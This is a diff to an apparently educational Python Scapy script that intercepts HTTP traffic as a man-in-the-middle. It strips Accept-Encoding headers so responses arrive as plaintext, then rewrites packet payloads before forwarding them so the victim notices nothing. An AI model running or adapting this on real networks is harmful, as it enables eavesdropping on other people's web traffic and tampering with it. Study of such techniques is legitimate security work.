@@ -36,11 +36,9 @@ def process_packet(packet):
             #and replace it with an empty string; this causes the browser to tell the server
             #it doesn't take any form of encoding, and the server will deliver the plaintext
             #web code
-            new_packet = set_load(scapy_packet, load)
-            packet.set_payload(str(new_packet))
             #regex to find and replace field that specifies encoding types accepted
             #replace with "" - empty string
-            print(scapy_packet.show())
+            #print(scapy_packet.show())
         elif scapy_packet[scapy.TCP].sport == 80: #if this exists, packet is HTTP response inbound
             print("===================================")
             print("[+] HTTP Response Inbound found:")
@@ -50,13 +48,16 @@ def process_packet(packet):
             #a string with something else
             #print(scapy_packet.show())
             
-            new_packet = set_load(scapy_packet, load)
-            packet.set_payload(str(new_packet))
             
             #want to first show the packet contents to see what fields to modify
             #using this you see that the Raw layer contains following:
             #Accept-Encoding: gzip, deflate
             #HTML is compressed with gzip then sent to client from server
+            
+        if load != scapy_packet[scapy.Raw].load: #if load var has changed
+            new_packet = set_load(scapy_packet, load)
+            packet.set_payload(str(new_packet))
+        
 
     packet.accept() #forward packets to target, connectivity seems normal
     
